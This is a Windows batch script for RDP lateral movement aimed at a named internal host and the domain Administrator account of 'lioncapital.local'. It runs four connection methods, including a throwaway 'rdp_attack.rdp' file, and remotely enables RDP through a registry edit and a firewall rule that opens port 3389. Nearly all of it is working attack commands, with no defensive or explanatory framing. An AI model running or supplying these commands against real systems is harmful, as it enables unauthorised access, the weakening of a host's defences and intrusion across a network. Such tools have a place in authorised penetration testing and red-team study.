@echo off
REM ============================================
REM Signed_RDP.bat - RDP lateral movement
REM ============================================

set "TARGET=10.19.8.102"

echo === RDP Connection Methods ===

:: Method 1: Direct mstsc
echo --- Method 1: mstsc directly ---
mstsc.exe /v:%TARGET% /u:lioncapital.local\Administrator

:: Method 2: runas netonly + mstsc
echo --- Method 2: runas + mstsc ---
runas.exe /netonly /user:lioncapital.local\Administrator "mstsc.exe /v:%TARGET%"

:: Method 3: Generate RDP file
echo --- Method 3: RDP file ---
(
echo full address:s:%TARGET%
echo username:s:lioncapital.local\Administrator
echo screen mode id:i:2
echo redirectclipboard:i:1
echo audiomode:i:0
) > %TEMP%\rdp_attack.rdp
mstsc.exe %TEMP%\rdp_attack.rdp
del %TEMP%\rdp_attack.rdp

:: Method 4: Enable RDP remotely (requires admin)
echo --- Method 4: Enable RDP on remote ---
reg.exe add "\\%TARGET%\HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh.exe advfirewall firewall add rule name="RDP" dir=in protocol=TCP localport=3389 action=allow remoteip=10.19.0.0/16
